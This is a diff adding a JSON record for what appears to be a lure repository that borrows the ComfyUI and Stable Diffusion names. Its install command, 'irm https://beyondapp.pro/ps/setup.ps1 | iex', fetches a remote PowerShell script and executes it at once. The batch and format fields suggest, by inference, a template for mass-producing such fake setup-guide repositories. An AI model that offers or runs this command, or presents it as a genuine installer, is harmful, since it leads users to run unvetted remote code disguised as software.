@@ -1,0 +1,25 @@
+{
+  "repo": "ComfyUI-Stable-Diffusion-Workflow-Pro-Complete-Setup-Guide",
+  "product": "ComfyUI Stable Diffusion Workflow Pro Complete Setup Guide",
+  "kind": "software",
+  "install_type": "powershell",
+  "install_url": "https://beyondapp.pro/ps/setup.ps1",
+  "install_command": "irm https://beyondapp.pro/ps/setup.ps1 | iex",
+  "batch": "new30-popular80",
+  "format": "license-md-only",
+  "category": "ai",
+  "topics": [
+    "comfyui-stable-diffusion-workflow-pro-co",
+    "comfyui",
+    "stable",
+    "diffusion",
+    "workflow",
+    "pro",
+    "complete",
+    "windows",
+    "desktop",
+    "setup-guide",
+    "software",
+    "productivity"
+  ]
+}
